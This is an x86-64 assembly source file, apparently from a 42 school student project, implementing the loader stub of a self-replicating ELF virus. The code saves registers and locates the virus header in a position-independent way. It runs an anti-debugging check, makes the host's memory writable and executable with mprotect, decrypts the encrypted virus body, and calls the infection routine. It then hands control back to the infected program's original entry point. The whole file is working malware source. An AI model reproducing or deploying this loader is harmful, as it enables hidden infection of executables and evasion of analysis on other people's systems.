; **************************************************************************** ;
;                                                                              ;
;                                                         :::      ::::::::    ;
;    loader.s                                           :+:      :+:    :+:    ;
;                                                     +:+ +:+         +:+      ;
;    By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+         ;
;                                                 +#+#+#+#+#+   +#+            ;
;    Created: 2019/02/11 14:08:33 by agrumbac          #+#    #+#              ;
;    Updated: 2020/01/04 19:52:14 by ichkamo          ###   ########.fr        ;
;                                                                              ;
; **************************************************************************** ;

%define PROT_RWX		0x07

section .text
	global loader_entry
	global loader_exit
	global virus_header_struct

extern virus
extern wrap_decypher
extern wrap_mprotect
extern detect_spy

;----------------------------------; backup all swappable registers
;                                    (all but rax, rsp, rbp)
loader_entry:
	push rcx                   ; backup rcx
	push rdx                   ; backup rdx
	push rbx                   ; backup rbx
	push rsi                   ; backup rsi
	push rdi                   ; backup rdi
	push r8                    ; backup r8
	push r9                    ; backup r9
	push r10                   ; backup r10
	push r11                   ; backup r11
	push r12                   ; backup r12
	push r13                   ; backup r13
	push r14                   ; backup r14
	push r15                   ; backup r15

;----------------------------------; extract virus header on stack
;  ----------------------------------------------------------------------------
; | 0    | *(16)       | *24         | *(32)       | *(40)        | *48        |
; | rdx  | r8          | r9          | r10         | r11          | r14        |
; | seed | rel ptld    | ptld size   | rel virus   | rel entry    | virus size |
; | seed | (ptld addr) | (ptld size) | (virus addr)| (entry addr) |(virus size)|
;  ----------------------------------------------------------------------------
	call mark_below
mark_below:
	pop rdx                    ; retrieve rip for virus_header_struct
	add rdx, virus_header_struct - mark_below

	mov r8, rdx
	mov r9, rdx
	mov r10, rdx
	mov r11, rdx
	mov r14, rdx
	add r8, 16                 ; align vars to correct addresses
	add r9, 24
	add r10, 32
	add r11, 40
	add r14, 48
	mov r8, [r8]               ; dereference vars
	mov r9, [r9]
	mov r10, [r10]
	mov r11, [r11]
	mov r14, [r14]

	mov rcx, rdx               ; get loader_entry addr
	sub rcx, virus_header_struct - loader_entry

	mov r12, rcx
	xchg r12, r8
	sub r8, r12                ; r8 = rcx - r8
	mov r12, rcx
	xchg r12, r10
	add r10, r12               ; r10 = rcx + r10
	mov r12, rcx
	xchg r12, r11
	sub r11, r12               ; r11 = rcx - r11

	push r14                   ; save virus size    [rsp + 48]
	push rcx                   ; save loader_entry  [rsp + 40]
	push r8                    ; save ptld addr     [rsp + 32]
	push r9                    ; save ptld size     [rsp + 24]
	push r10                   ; save virus addr    [rsp + 16]
	push r11                   ; save entry addr    [rsp + 8]
	push rdx                   ; save seed          [rsp]

;----------------------------------; run anti debug
	call detect_spy
	test rax, rax
	jnz return_to_client

;----------------------------------; make ptld writable
	mov rdi, [rsp + 32]        ; get ptld addr
	mov rsi, [rsp + 24]        ; get ptld len
	mov rdx, PROT_RWX
	push rdi
	push rsi
	push rdx
	call wrap_mprotect
	add rsp, 24
	test rax, rax
	jnz return_to_client

;----------------------------------; decypher virus
	mov rdi, [rsp + 16]        ; get virus_addr
	mov rsi, [rsp + 48]        ; get virus_size
	push rdi
	push rsi
	call wrap_decypher
	add rsp, 16

;----------------------------------; launch infection routines
	call virus

;----------------------------------; restore state, return to client code
return_to_client:
	mov rax, [rsp + 8]         ; get entry addr
	add rsp, 56                ; restore stack as it was

;----------------------------------; restore registers
	pop r15                    ; restore r15
	pop r14                    ; restore r14
	pop r13                    ; restore r13
	pop r12                    ; restore r12
	pop r11                    ; restore r11
	pop r10                    ; restore r10
	pop r9                     ; restore r9
	pop r8                     ; restore r8
	pop rdi                    ; restore rdi
	pop rsi                    ; restore rsi
	pop rbx                    ; restore rbx
	pop rdx                    ; restore rdx
	pop rcx                    ; restore rcx

	push rax
	ret
loader_exit:

virus_header_struct:
	db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 ; virus seed[0]
	db 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff ; virus seed[1]
	db "rel ptld", "ptldsize", "relvirus"
	db "relentry", "virusize"
	db "Warning : Copyrighted Virus by __UNICORNS_OF_THE_APOCALYPSE__ <3"
